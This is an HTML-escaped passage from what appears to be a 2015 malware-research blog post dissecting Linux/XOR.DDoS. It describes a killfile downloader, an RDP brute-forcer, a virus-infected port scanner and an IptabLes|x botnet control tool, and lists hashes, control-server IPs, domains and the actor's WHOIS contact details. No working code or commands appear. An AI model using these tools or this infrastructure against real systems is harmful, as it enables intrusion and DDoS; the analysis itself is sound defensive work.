Network America, Inc.\"\u003Cbr \/\u003E\u003Cbr \/\u003E  \"ip\": \"122.10.85.54\",\u003Cbr \/\u003E  \"country\": \"HK\",\u003Cbr \/\u003E  \"loc\": \"22.2500,114.1667\",\u003Cbr \/\u003E  \"org\": \"AS55933 Cloudie Limited\"\u003Cbr \/\u003E\u003Cbr \/\u003E  \"ip\": \"211.110.1.32\",\u003Cbr \/\u003E  \"country\": \"KR\",\u003Cbr \/\u003E  \"loc\": \"37.5700,126.9800\",\u003Cbr \/\u003E  \"org\": \"AS9318 Hanaro Telecom Inc.\"\u003Cbr \/\u003E}\u003C\/pre\u003E \u003Cp\u003EThe samples are all in the Virus Total servers, please search these hashes,  \u003Cpre class=\"brush: asm\"\u003EMD5 (3503.rar) = 238ee6c5dd9a9ad3914edd062722ee50\u003Cbr \/\u003EMD5 (3504.rar) = 09489aa91b9b4b3c20eb71cd4ac96fe9\u003Cbr \/\u003EMD5 (3505.rar) = 5c5173b20c3fdde1a0f5a80722ea70a2\u003Cbr \/\u003EMD5 (3506.rar) = d9304156eb9a263e3d218adc20f71400\u003Cbr \/\u003EMD5 (3507.rar) = 3492562e7537a40976c7d27b4624b3b3\u003Cbr \/\u003EMD5 (3508.rar) = ba8cc765ea0564abf5be5f39df121b0b\u003Cbr \/\u003EMD5 (6000.rar) = 73fd29f4be88d5844cee0e845dbd3dc5\u003Cbr \/\u003EMD5 (6001.rar) = a5e15e3565219d28cdeec513036dcd53\u003Cbr \/\u003EMD5 (6002.rar) = fd908038fb6d7f42f08d54510342a3b7\u003Cbr \/\u003EMD5 (6003.rar) = ee5edcc4d824db63a8c8264a8631f067\u003Cbr \/\u003EMD5 (6004.rar) = 1aed11a0cbc2407af3ca7d25c855d9a5\u003Cbr \/\u003EMD5 (6005.rar) = 2edd464a8a6b49f1082ac3cc92747ba2\u003Cbr \/\u003EMD5 (g.rar) = 758a6c01402526188f3689bd527edf83 \u003C\/pre\u003E \u003Ca name=\"killfile\"\u003E\u003Cp\u003E\u003Ch2\u003E\u003Cb\u003E\"Linux\/killfile\"\u003C\/b\u003E ELF (downloader, kills processes \u0026 runs etc malware)\u003C\/h2\u003E\u003C\/a\u003E \u003Cp\u003EWe've never seen about this before, so I will explain here a bit. Linux\/XOR.DDoS through the encrypted communication will download other malware files from the remote CNC. In the CNC there is a set of ELF malware downloaders, depends on the architecture of the infected server\/host, one of the set of binary (x32 or x64) below will be run in the infected machine for that purpose. These ELF binaries are ELF executable \u003Cb\u003Ekillfile\u003C\/b\u003E module, a downloader for the config files for aiming the process to be killed and \"other\" malware be run. It has the logic to read strings from textual file (kill.txt or run.txt) which seperated token with the delimeter pipe \"|\" for the kill\/run functionality mentioned. \u003Cbr\u003E\u003Cpre class=\"brush: asm\"\u003EMD5 (killfile32) = e98b05b01df42d0e0b01b97386a562d7  15282 Apr  3  2014 killfile32*\u003Cbr \/\u003EMD5 (killfile64) = 57fdf267a0efd208eede8aa4fb2e1d91  20322 Apr  3  2014 killfile64*\u003C\/pre\u003EI will explain some important functions of this module.  \u003Cp\u003E\u003Cb\u003Ekillfile \u003C\/b\u003Emalware was coded in C, and these are the source files used:\u003Cbr\u003E\u003Cpre class=\"brush: asm\"\u003E 'crtstuff.c'\u003Cbr \/\u003E 'btv1.2.c'\u003Cbr \/\u003E 'http_download.c'\u003Cbr \/\u003E 'libsock.c'\u003C\/pre\u003EIt fakes itself as the bluetooth process:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-xyGmEnEX88A\/VaY8l5j88ZI\/AAAAAAAASiE\/E7xTzaQuT_s\/s2640-Ic42\/015.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-xyGmEnEX88A\/VaY8l5j88ZI\/AAAAAAAASiE\/E7xTzaQuT_s\/s580-Ic42\/015.png\u003E\u003C\/a\u003E \u003Cp\u003EFaking Microsoft too..(try to read the code below, it's a self-explanatory)\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-wGa7u5wD6RY\/Vai7lUblvcI\/AAAAAAAASms\/85UkWZTTPXA\/s2512-Ic42\/044.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-wGa7u5wD6RY\/Vai7lUblvcI\/AAAAAAAASms\/85UkWZTTPXA\/s580-Ic42\/044.png\u003E\u003C\/a\u003E \u003Cp\u003EIn the first two samples we grabbed, it kills the listed process name which was downloaded from the below hostname AND IP: \u003Cpre class=\"brush: asm\"\u003Ekill.et2046.com \u003Cbr \/\u003Esb.et2046.com\u003Cbr \/\u003E115.23.172.31\u003C\/pre\u003Ebelow is the reversing sheet for the killing list:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-EGIJ3PHtMxY\/VaZMl_uqGDI\/AAAAAAAASiY\/vQAvACX08t8\/s2580-Ic42\/017.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-EGIJ3PHtMxY\/VaZMl_uqGDI\/AAAAAAAASiY\/vQAvACX08t8\/s580-Ic42\/017.png\u003E\u003C\/a\u003E\u003Cbr\u003EThe IP is located in Korea Telecom, which it seems the bad actor hacked the server:\u003Cbr\u003E\u003Cpre class=\"brush: asm\"\u003E{\u003Cbr \/\u003E  \"ip\": \"115.23.172.31\",\u003Cbr \/\u003E  \"hostname\": \"kill.et2046.com\",\u003Cbr \/\u003E  \"city\": Seoul,\u003Cbr \/\u003E  \"country\": \"KR\",\u003Cbr \/\u003E  \"loc\": \"37.5700,126.9800\",\u003Cbr \/\u003E  \"org\": \"AS4766 Korea Telecom\"\u003Cbr \/\u003E}\u003Cbr \/\u003E\u003C\/pre\u003EAnd the \u003Cb\u003Eet2046.com\u003C\/b\u003E domain used can't be good one, is registered in GoDaddy under below information:\u003Cbr\u003E\u003Cpre class=\"brush: asm\"\u003E\u003Cbr \/\u003E   Domain Name: ET2046.COM\u003Cbr \/\u003E   Registrar: GODADDY.COM, LLC\u003Cbr \/\u003E   Sponsoring Registrar IANA ID: 146\u003Cbr \/\u003E   Whois Server: whois.godaddy.com\u003Cbr \/\u003E   Referral URL: http:\/\/registrar.godaddy.com\u003Cbr \/\u003E   Name Server: A.DNSPOD.COM\u003Cbr \/\u003E   Name Server: B.DNSPOD.COM\u003Cbr \/\u003E   Name Server: C.DNSPOD.COM\u003Cbr \/\u003E   Status: clientDeleteProhibited http:\/\/www.icann.org\/epp#clientDeleteProhibited\u003Cbr \/\u003E   Status: clientRenewProhibited http:\/\/www.icann.org\/epp#clientRenewProhibited\u003Cbr \/\u003E   Status: clientTransferProhibited http:\/\/www.icann.org\/epp#clientTransferProhibited\u003Cbr \/\u003E   Status: clientUpdateProhibited http:\/\/www.icann.org\/epp#clientUpdateProhibited\u003Cbr \/\u003E   Updated Date: 21-dec-2014\u003Cbr \/\u003E   Creation Date: 27-nov-2012\u003Cbr \/\u003E   Expiration Date: 27-nov-2016\u003Cbr \/\u003E   Last update of whois database: Thu, 16 Jul 2015 22:17:47 GMT \u003C\u003C\u003C\u003Cbr \/\u003E\u003C\/pre\u003EWith the contact email address of \u003Cb\u003E\u003Cfont color=yellow size=+1\u003Etuhao550@gmail.com\u003C\/font\u003E\u003C\/b\u003E:\u003Cbr\u003E\u003Cpre class=\"brush: asm\"\u003E   Registry Registrant ID:\u003Cbr \/\u003E   Registrant Name: smaina smaina\u003Cbr \/\u003E   Registrant Organization:\u003Cbr \/\u003E   Registrant Street: Beijing\u003Cbr \/\u003E   Registrant City: Beijing\u003Cbr \/\u003E   Registrant State\/Province: Beijing\u003Cbr \/\u003E   Registrant Postal Code: 100080\u003Cbr \/\u003E   Registrant Country: China\u003Cbr \/\u003E   Registrant Phone: +86.18622222222\u003Cbr \/\u003E   Registrant Email: \"tuhao550@gmail.com\"\u003Cbr \/\u003E\u003C\/pre\u003Ethis domain and this email address also found by our friend Dr. DiMino in DeepEndResearch [\u003Ca href=\"http:\/\/www.deependresearch.org\/2015\/02\/linuxbackdoorxnote1-indicators.html\"\u003Elink\u003C\/a\u003E]\u003Cp\u003EThe activity of the domain above according to passive DNS shows as per below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-y4PnvmVlhnM\/VaiQC622W1I\/AAAAAAAASlw\/QixEgEOxHNM\/s2512-Ic42\/042.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-y4PnvmVlhnM\/VaiQC622W1I\/AAAAAAAASlw\/QixEgEOxHNM\/s512-Ic42\/042.png\u003E\u003C\/a\u003E \u003Cp\u003EBack to what \u003Cb\u003ELinux\/KillFile\u003C\/b\u003E ELF malware does. It then downloads \u0026 executes the other malicious software described in the \u003Cb\u003Erun.txt \u003C\/b\u003Edownloaded from the URL described above, and in this case the contents of \u003Cb\u003Erun.txt\u003C\/b\u003E is the infamous \u003Cb\u003E\"IptabLes|x\"\u003C\/b\u003E ELF DDoS'er malware!! Wow, so Xor.DDoS is also \"merging\" with \u003Cb\u003EIptabLes|x\u003C\/b\u003E too.. I thought that only \u003Cb\u003EChinaZ\u003C\/b\u003E who was just starting to \"collaborate\" with \u003Cb\u003EIptabLes|x\u003C\/b\u003E. Is \u003Cb\u003EIptabLes|x\u003C\/b\u003E becoming open source in China malware underground now? Why recent dangerous actors are starting to switch their tools here? This is the fact to be checked further..\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-0dRZjq_A0sQ\/VaY8mIEqlFI\/AAAAAAAASiI\/5WetqUfiyzE\/s2640-Ic42\/016.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-0dRZjq_A0sQ\/VaY8mIEqlFI\/AAAAAAAASiI\/5WetqUfiyzE\/s580-Ic42\/016.png\u003E\u003C\/a\u003E\u003Cbr\u003E \u003Cp\u003EThe binary is clean and you can see the download source, files to download, and the fake user-agent set (noted string: \u003Cb\u003E\"TencentTraveler\"\u003C\/b\u003E ), that can be used to quick mitigate the threat:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-JuMxrq_gKjE\/VayIBWas6NI\/AAAAAAAASo0\/aHMS8g2jPX4\/s1720-Ic42\/000000.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-JuMxrq_gKjE\/VayIBWas6NI\/AAAAAAAASo0\/aHMS8g2jPX4\/s580-Ic42\/000000.png\u003E\u003C\/a\u003E \u003Cp\u003EThese first two \u003Cb\u003ELinux\/KillFile \u003C\/b\u003EELF malware were compiled in 2014 it was old binaries, but seems to be used many times already in several infection too. yet the VT score for these modules are \u003Cb\u003Estill zero, see\u003C\/b\u003E--\u003E [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/35b2c1592fe394fc8d12d7a67fa54d5c7e7cf1b7ad3dc78e530d761628374006\/analysis\/1436962486\/\"\u003E-1-\u003C\/a\u003E] and [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/82ba1e7c02b91ee4298717f9a8ba20aae3063107c8d818463ceb5829e5746b48\/analysis\/1436962528\/\"\u003E-2-\u003C\/a\u003E]. There is another Linux\/KillFile prepared by the crook for THIS infection, inside the \"job package\", we will discuss it in Under the Hood part.  \u003Cp\u003EWe are adding the new \u003Cb\u003E\u003Cfont color=yellow\u003EELF Linux\/killfile\u003C\/font\u003E\u003C\/b\u003E on category downloader in in our beloved repository at \u003Cb\u003Ekernelmode\u003C\/b\u003E. \u003Cblockquote class=\"twitter-tweet\" data-cards=\"hidden\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EI opened new \u003Ca href=\"https:\/\/twitter.com\/hashtag\/ELF?src=hash\"\u003E#ELF\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/malware?src=hash\"\u003E#malware\u003C\/a\u003E repository of \u003Ca href=\"https:\/\/twitter.com\/hashtag\/Linux?src=hash\"\u003E#Linux\u003C\/a\u003E\/KillFile in kernelmode: \u003Ca href=\"http:\/\/t.co\/ms58gqPWU3\"\u003Ehttp:\/\/t.co\/ms58gqPWU3\u003C\/a\u003E\u0026#10;cc: \u003Ca href=\"https:\/\/twitter.com\/Xylit0l\"\u003E@Xylit0l\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hFireF0X\"\u003E@hFireF0X\u003C\/a\u003E \u003Ca href=\"http:\/\/t.co\/yXdANOmnJ3\"\u003Epic.twitter.com\/yXdANOmnJ3\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/621965166003949569\"\u003EJuly 17, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003E\u003Ch2\u003EUnder the hood\u003C\/h2\u003E \u003Cp\u003EMaybe you read many similar reports like previous parts of this post so many times. Maybe you get bored by information about China malware..CNC..IP..DDOS..with same stories and reports. This time we have a new report of what's \u003Cb\u003E\u003Ci\u003EUnder the Hood\u003C\/i\u003E\u003C\/b\u003E of those CNC actually. \u003Cb\u003EBeforehand, \u003C\/b\u003Eeverything that is posted here is done by remote legit access via HTTP protocol ONLY, so I am sorry if you expect more than that, no hacking, no offensive method were applied. And all of these efforts from this section \u003Cb\u003Eare done by the team work of our ELF Team\u003C\/b\u003E.  \u003Cp\u003EWe've been hit by XOR.DDoS many times without knowing much what are they up to actually. Curiosity kills, so we randomly select the reachable IP to check what can be \u003Ci\u003Elegally \u003C\/i\u003Ecollected. And from one of the IP announced above we collected these \"specific\" passworded archives:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-YGSlsk2JeKU\/VaZWDEwfshI\/AAAAAAAASio\/LFwTjtk6rXk\/s2880-Ic42\/018.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-YGSlsk2JeKU\/VaZWDEwfshI\/AAAAAAAASio\/LFwTjtk6rXk\/s580-Ic42\/018.png\u003E\u003C\/a\u003E \u003Cp\u003ESome archives is passworded by the crooks, but it's crackable :-) We won't reveal the password in here in here since it contains rootkits, vulnerability scanner, CNC program, ELF VIRUS and trojans (downloader\/backconnect) a set used by this bad actor(s) to attack us. And the file is still up and alive:\u003Cbr\u003E\u003Ciframe width=\"580\" height=\"326\" src=\"https:\/\/www.youtube.com\/embed\/J3BKtic38FQ?rel=0\u0026amp;controls=0\u0026amp;showinfo=0\" frameborder=\"0\" allowfullscreen\u003E\u003C\/iframe\u003E \u003Cp\u003E\u003Ch2\u003EThe RDP scanner set \u003Cb\u003Erdp.rar\u003C\/b\u003E\u003C\/h2\u003E \u003Cp\u003EThis is a literally ELF RDP scanner set, the engine scanner (rdp ELF executable binary) is scanning the defined range of IP to alive hosts that runs the RDP to be bruted with the dictionary attack for the user's login and password. It has the control parameter to set the thread used for scanning and the termination condition for the first matched user. It is obviously the coder is not native English speaking person, we saw a lot of these in windows version but we think this ELF version tool is being used by the very limited people only. Below is the screenshot of it's CLI (command line user's interface): \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-ucGaQ3iY8rM\/VaZ8WDi0eVI\/AAAAAAAASi4\/WG9lE-w1mNE\/s2576-Ic42\/020_phixr.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-ucGaQ3iY8rM\/VaZ8WDi0eVI\/AAAAAAAASi4\/WG9lE-w1mNE\/s580-Ic42\/020_phixr.png\u003E\u003C\/a\u003E \u003Cp\u003EThe \u003Cb\u003Erdp \u003C\/b\u003Ebinary program is the main engine of rdp's hacktool set, in order to automate an attack the crook is using the accompanied scripts for that purpose, we found the shell script \u003Cb\u003E\"a\"\u003C\/b\u003E and \u003Cb\u003E\"start\"\u003C\/b\u003E for that purpose, with the snip as per below snapshot. Noted, without the \u003Cb\u003E\"rdp\"\u003C\/b\u003E binary these scripts are just useless.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-ufpO3tRm9ew\/VaZ_lo9dgkI\/AAAAAAAASjE\/pI0J1AU8N9I\/s2576-Ic42\/021_phixr.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-ufpO3tRm9ew\/VaZ_lo9dgkI\/AAAAAAAASjE\/pI0J1AU8N9I\/s580-Ic42\/021_phixr.png\u003E\u003C\/a\u003E \u003Cp\u003EThe XOR.DDoS bad actor left some data in the text files used in this ELF hacking set, you can see the snips of the data contains: user name used to brute, wordlist to brute, and there is some result for the scanning done by crook in suspected output file vuln.txt, picture as PoC\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-NgoRQWf5ty8\/VaaCi5ple3I\/AAAAAAAASjQ\/JTicDhWzMxk\/s2640-Ic42\/022_phixr.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-NgoRQWf5ty8\/VaaCi5ple3I\/AAAAAAAASjQ\/JTicDhWzMxk\/s580-Ic42\/022_phixr.png\u003E\u003C\/a\u003E\u003Cbr\u003ESeeing the screeshots above I think it is very clear to explain of what rdp can do, and how it was used by the Linux\/XOR.DDoS actor to brute some windows networks for their hacking activity, so I don't make any video of it. This rdp ELF is new to us, we will call it as \u003Cb\u003ELinux\/rdp\u003C\/b\u003E as ELF hacktool from now on and making a new repository for this variant in beloved \u003Cb\u003Ekernelmode\u003C\/b\u003E.  \u003Cp\u003EIs that all for what's in rdp.rar? No, there is a binary named as \u003Cb\u003E\"psc\"\u003C\/b\u003E, it's an ELF executable with the below details: \u003Cpre class=\"brush: asm\"\u003E16840 Nov 24 psc fcd078dc4cec1c91ac0a9a2e2bc5df25\u003Cbr \/\u003Epsc: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), \u003Cbr \/\u003E     dynamically linked (uses shared libs), for GNU\/Linux 2.2.5, not stripped\u003Cbr \/\u003E\u003C\/pre\u003EIf you just check this psc into the Virus Total [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/d3e770780e03c8774b1e7bdbde17790c0ad5b36c82716e375134f234ca85a596\/analysis\/\"\u003Elink\u003C\/a\u003E] it is shown with a full verdict (37\/56) from AV companies as a Linux ELF Virus, a known nasty variant called \u003Cb\u003ELinux\/RST\u003C\/b\u003E who infect to other ELF \u0026 opening backdoor [\u003Ca href=\"https:\/\/www.symantec.com\/security_response\/writeup.jsp?docid=2004-052312-2729-99\"\u003Elink\u003C\/a\u003E]. This looks very bad isn't it...  \u003Cp\u003EThe ELF \"psc\" is supposedly a hacktool the port scanner called \u003Cb\u003E\"pscan\"\u003C\/b\u003E that is used a lot by blackhats for scanning and hacking the server by scanning the victim's SSH ports, I know whitehats that's using it for good purpose too, like for penetration test. MMD blog is actually discussed about this \u003Cb\u003E\u003Ci\u003Ehacktool\u003C\/i\u003E \u003C\/b\u003Ein case MMD-0023-2014 [\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2014\/05\/a-payback-to-ssh-bruting-crooks.html\"\u003Elink\u003C\/a\u003E]. \u003Cbr\u003E We test-run it. It showed what \u003Cb\u003E\"pscan\"\u003C\/b\u003E does, looks like the XOR.DDoS is shortened he name into \u003Cb\u003E\"psc\"\u003C\/b\u003E.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-38JT-nTCUKI\/Vad3MRNyvXI\/AAAAAAAASk0\/frFONrAIhhY\/s2640-Ic42\/030.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-38JT-nTCUKI\/Vad3MRNyvXI\/AAAAAAAASk0\/frFONrAIhhY\/s580-Ic42\/030.png\u003E\u003C\/a\u003E\u003Cp\u003EThe \u003Cb\u003Epscan \u003C\/b\u003Estrings inside is as below...and some code reversing shows that many of pscan functions are there too.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-D4SNzyrjdTw\/VacsLivBNLI\/AAAAAAAASj4\/C3lTWaGtw1g\/s2660-Ic42\/032.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-D4SNzyrjdTw\/VacsLivBNLI\/AAAAAAAASj4\/C3lTWaGtw1g\/s580-Ic42\/032.png\u003E\u003C\/a\u003E\u003Cbr\u003ENow..why it was called infected by virus? Thank's to Miroslav Legen for advising me to check the entry point part. The actual entry point of \"psc\" was \"patched\" to 0x08049364 and malicious entry point is taking over the real one (0x080487a8), for the purpose to run the malicious commands and then go to the original entry point that has being saved in some values. The picture below is explaining reversing note I did while checking this \u003Ci\u003Eentry point shifting phenomenon.\u003C\/i\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-AS-Tb0DJzQc\/Vad2ZwkZ_rI\/AAAAAAAASko\/UDIap6dCttY\/s2912-Ic42\/035_phixr.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-AS-Tb0DJzQc\/Vad2ZwkZ_rI\/AAAAAAAASko\/UDIap6dCttY\/s580-Ic42\/035_phixr.png\u003E\u003C\/a\u003E\u003Cbr\u003EFor the update information, the \"rdp\" ELF binary above is also has the entry point shifted too..\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-0RX-BRO5ce0\/VagrIzLkySI\/AAAAAAAASlU\/Ab8NujRv1fc\/s2512-Ic42\/040.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-0RX-BRO5ce0\/VagrIzLkySI\/AAAAAAAASlU\/Ab8NujRv1fc\/s400-Ic42\/040.png\u003E\u003C\/a\u003E\u003Cp\u003EThe fact is..We found many samples of malware or hacktools detected in the IP in China's hosts are infected also with another malware, so this could be just one of such case, it's not a trusted environment anyway, and we suggest \u003Cb\u003E\u003Ci\u003Eplease don't run anything that coming from untrusted environment\u003C\/i\u003E\u003C\/b\u003E.  I am not so sure if the XOR.DdoS actor are noticing this or are in purpose for putting this virus infected ELF hacktool into their archive or not (naah..I think they don't know about this..considering they pout password to the archive), But I really hope they had been infected by this badness instead :D  \u003Cp\u003E\u003Ch2\u003EThe set of .IptabLes botnets inside of Xor.DDoS CNC\u003C\/h2\u003E \u003Cp\u003EIn the package called \"job.rar\", the actor wrapped everything needed to perform an attack to our networks into this one single file archive. It has the download modules of \u003Cb\u003E\"killfile\"\u003C\/b\u003E with the pair of text files contain of processes to kill (kill.txt) and the malware binary name to be executed post downloads (run.txt). We explained this module in \u003Cb\u003E\u003Ci\u003EModular \"killfile\" ELF\u003C\/i\u003E\u003C\/b\u003E section in previous section.  \u003Cp\u003EThere is a rootkit too which I will explain and show the codes in a video it in the last section, but the point that I want to explain now is: \u003Ci\u003E\u003Cfont color=yellow\u003Ethere a set of the \u003Cb\u003E.IptabLes|x\u003C\/b\u003E clients (ELF) and its server botnet CNC in side of the job.rar\u003C\/font\u003E\u003C\/i\u003E, these are actually files spotted inside of the job.rar archive, to be clear here's the archive:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-EWCmW0g-Bls\/VadPw7kKL4I\/AAAAAAAASkY\/E-RoEMDbsO8\/s2912-Ic42\/034_phixr.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-EWCmW0g-Bls\/VadPw7kKL4I\/AAAAAAAASkY\/E-RoEMDbsO8\/s580-Ic42\/034_phixr.png\u003E\u003C\/a\u003E \u003Cp\u003EThe \u003Cb\u003E.IptabLes|x\u003C\/b\u003E ELF client binaries (ELF bot malware) we already covered in previously posted analysis like in--\u003E [\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2015\/06\/mmd-0035-2015-iptablex-or-iptables-on.html\"\u003E-1-\u003C\/a\u003E] and [\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2014\/06\/mmd-0025-2014-itw-infection-of-elf.html\"\u003E-2-\u003C\/a\u003E]. And these binaries has nothing new and it was set to connect to the IP where the CNC botnet (Windows PE) software is running. We move on straight to the botnet CNC software itself..  \u003Cp\u003EThe binary is the .NET one. We uploaded it to VirusTotal here--\u003E[\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/37e6f378156bfeb5a95fe396baf97331bb547a63aa712a9931a9dcc4bde0d2fe\/analysis\/\"\u003Elink\u003C\/a\u003E]. And I made a video of running test this CNC tool to give you the idea how is it work, as per video below:\u003Cbr\u003E\u003Ciframe width=\"580\" height=\"326\" src=\"https:\/\/www.youtube.com\/embed\/hX569_ai6jY?rel=0\u0026amp;controls=0\u0026amp;showinfo=0\" frameborder=\"0\" allowfullscreen\u003E\u003C\/iframe\u003E\u003Cbr\u003EFor the details of what this botnet CNC tool can do, can be studied by reading the reversed source code we reproduced, we modified the code a bit (for can not be re-used..but is very readable) click the below snapshot picture for access (to our pastebin):\u003Cbr\u003E\u003Ca href=\"https:\/\/pastebin.com\/xDCipBY1\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-oZ5DMMlakRc\/VaeAFyLYHbI\/AAAAAAAASlE\/hYfFWnCyzw8\/s400-Ic42\/036.png\u003E\u003C\/a\u003E\u003Cbr\u003EBelow is the MD5 list of the IptabLes|x client and CNC botnet tool:\u003Cbr\u003E\u003Cpre class=\"brush: asm\"\u003EMD5 (777.hb) = \"e2a9b9fc7d5e44ea91a2242027c2f725\"\u003Cbr \/\u003EMD5 (888.hb) = \"ff1a6cc1e22c64270c9b24d466b88540\"\u003Cbr \/\u003EMD5 (901.hb) = \"c0233fc30df55334f36123ca0c4d4adf\"\u003Cbr \/\u003EMD5 (903.hb) = \"f240b3494771008a1271538798e6c799\"\u003Cbr \/\u003EMD5 (905.hb) = \"603f16c558fed2ea2a6d0cce82c3ba3a\"\u003Cbr \/\u003EMD5 (Control.exe) = \"315d102f1f6b3c6298f6df31daf03dcd\"\u003C\/pre\u003E \u003Cblockquote class=\"twitter-tweet\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EWe share of \u003Ca href=\"https:\/\/twitter.com\/hashtag\/Linux?src=hash\"\u003E#Linux\u003C\/a\u003E\/.IptabLes|x \u003Ca href=\"https:\/\/twitter.com\/hashtag\/botnet?src=hash\"\u003E#botnet\u003C\/a\u003E CNC PE tool, only in \u003Ca href=\"http:\/\/t.co\/X5acf609QS\"\u003Ehttp:\/\/t.co\/X5acf609QS\u003C\/a\u003E \u003Ca href=\"http:\/\/t.co\/Nr7mrK4qdd\"\u003Ehttp:\/\/t.co\/Nr7mrK4qdd\u003C\/a\u003E\u0026#10;c:\u003Ca href=\"https:\/\/twitter.com\/hFireF0X\"\u003E@hFireF0X\u003C\/a\u003E \u003Ca href=\"http:\/\/t.co\/wrCqXR9vC9\"\u003Epic.twitter.com\/wrCqXR9vC9\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/622878098514534400\"\u003EJuly 19, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003E\u003Ch2\u003EThe \u003Cb\u003E\"Linux\/KillFile\"\u003C\/b\u003E set: xxz.rar, kill.txt, run.txt\u003C\/h2\u003E \u003Cp\u003EIn the job package [\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-EWCmW0g-Bls\/VadPw7kKL4I\/AAAAAAAASkY\/E-RoEMDbsO8\/s2720-Ic42\/034_phixr.png\"\u003Elink\u003C\/a\u003E] there is a set of Linux\/KillFile malware, with the binary faking as rar file called \"xxz.rar\". This Linux\/KillFile is exactly work with the same logic with the previously explain in above section [\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2015\/07\/mmd-0037-2015-bad-shellshock.html#killfile\"\u003Elink\u003C\/a\u003E] , the difference is, the previous two samples was used by the bad actor for etc purpose unrelated to this infection, but this xxz.rar is there to be used on this campaign. The role of the Linux\/KillFile is the downloader and installation of the Linux\/IptabLes|x client malware botnet described previously.  \u003Cp\u003EIn this version of Linux\/KillFile, after execution the downloaded file, it uses fake \"version\"(in this case it was downloaded .IptabLes|x) into \"Microsoft\"..\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-wGa7u5wD6RY\/Vai7lUblvcI\/AAAAAAAASms\/85UkWZTTPXA\/s580-Ic42\/044.png\u003E \u003Cp\u003EThe other big difference is in the data of remote hosts they use to connect and fetch data from remote:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-o8YaOnUCvu8\/VaibzyNi3UI\/AAAAAAAASmA\/SdQ5MThTY6Q\/s2721-Ic42\/043.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-o8YaOnUCvu8\/VaibzyNi3UI\/AAAAAAAASmA\/SdQ5MThTY6Q\/s580-Ic42\/043.png\u003E\u003C\/a\u003E\u003Cbr\u003EAccordingly we have a new infrastructure IP of: \u003Cb\u003E61.33.28.194 and 115.23.172.47\u003C\/b\u003E which is also located in Korea:\u003Cbr\u003E\u003Cpre class=\"brush: asm\"\u003E{\u003Cbr \/\u003E  \"ip\": \"61.33.28.194\",\u003Cbr \/\u003E  \"hostname\": \"No Hostname\",\u003Cbr \/\u003E  \"city\": null,\u003Cbr \/\u003E  \"country\": \"KR\",\u003Cbr \/\u003E  \"loc\": \"37.5700,126.9800\",\u003Cbr \/\u003E  \"org\": \"AS3786 LG DACOM Corporation\"\u003Cbr \/\u003E}\u003C\/pre\u003EI am pretty sure that et2046.com domain is under control if the bad actor and below chronological IP data linked to this case \/et2046.com, must be linked to the actor: \u003Cpre\u003E\u003Cb\u003E\u003Ci\u003E\u003Cfont color=orange\u003E115.23.172.31 (current)\u003Cbr \/\u003E115.23.172.6 